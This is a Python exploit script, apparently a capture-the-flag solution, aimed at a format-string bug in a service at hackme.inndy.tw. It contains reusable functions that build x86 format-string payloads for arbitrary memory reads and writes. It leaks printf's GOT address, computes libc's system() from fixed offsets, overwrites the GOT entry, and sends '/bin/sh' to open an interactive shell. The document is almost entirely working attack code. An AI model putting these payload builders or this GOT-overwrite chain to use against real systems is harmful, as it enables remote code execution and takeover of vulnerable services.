#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

def GetIntegerSequenceLength(a, b):
    result = 0
    boundary = 10
    while boundary < b:
        if boundary >= a:
            result += (boundary - a) * (len(str(boundary)) - 1)
            a = boundary
        boundary *= 10
    result += (b - a)  * len(str(a))
    return result

def WriteBytesPayloadX86(offset, addr, bs):
    bytes_dict = {}
    for i in range(len(bs)):
        b = ord(bs[i])
        v = bytes_dict.get(b)
        if v == None:
            bytes_dict[b] = [ addr + i ]
        else:
            bytes_dict[b].append(addr + i)

    chars_written = 0
    addrs_count = 0
    payload = ''
    for k in sorted(bytes_dict.keys()):
        if k - chars_written == 0:
            payload += '%|$hhn' * len(bytes_dict[k])
        else:
            payload += '%%%dc' % (k - chars_written)  + '%|$hhn' * len(bytes_dict[k])
        chars_written = k
        addrs_count += len(bytes_dict[k])

    begin_index = offset
    while True:
        l = len(payload) - addrs_count + GetIntegerSequenceLength(begin_index, begin_index + addrs_count)
        l += (4 - l % 4) % 4
        if begin_index >= l // 4 + offset:
            break
        else:
            begin_index = l // 4 + offset

    i = -1
    while True:
        i = payload.find('|', i + 1)
        if i == -1:
            break
        else:
            payload = payload[:i] + str(begin_index) + payload[i + 1:]
            begin_index += 1
    
    payload += '\x00' * ((4 - len(payload) % 4) % 4)

    for k in sorted(bytes_dict.keys()):
        for address in bytes_dict[k]:
            payload += pack(address, 32)
    
    return payload

def ReadBytesPayloadX86(offset, addr, size):
    payload = '%%|$.%ds' % size

    begin_index = offset
    addrs_count = 1
    while True:
        l = len(payload) - addrs_count + GetIntegerSequenceLength(begin_index, begin_index + addrs_count)
        l += (4 - l % 4) % 4
        if begin_index >= l // 4 + offset:
            break
        else:
            begin_index = l // 4 + offset

    i = payload.find('|')
    payload = payload[0:i] + str(begin_index) + payload[i + 1:]
    payload += '\x00' * ((4 - len(payload) % 4) % 4)
    payload += pack(addr, 32)
    return payload

GOT_printf_addr = 0x0804A010

conn = connect('hackme.inndy.tw', 7711)

payload = ReadBytesPayloadX86(7, GOT_printf_addr, 4)
conn.sendline(payload)
recv = conn.read()

libc_printf_addr = unpack(recv.ljust(4, '\x00')[0:4], 32)
libc_system_addr = libc_printf_addr - 0x00049590 + 0x0003ad80
log.info('libc_printf_addr = 0x%08x' % libc_printf_addr)
log.info('libc_system_addr = 0x%08x' % libc_system_addr)

payload = WriteBytesPayloadX86(7, GOT_printf_addr, pack(libc_system_addr, 32))
conn.sendline(payload); conn.read()

conn.sendline('/bin/sh')
conn.interactive()

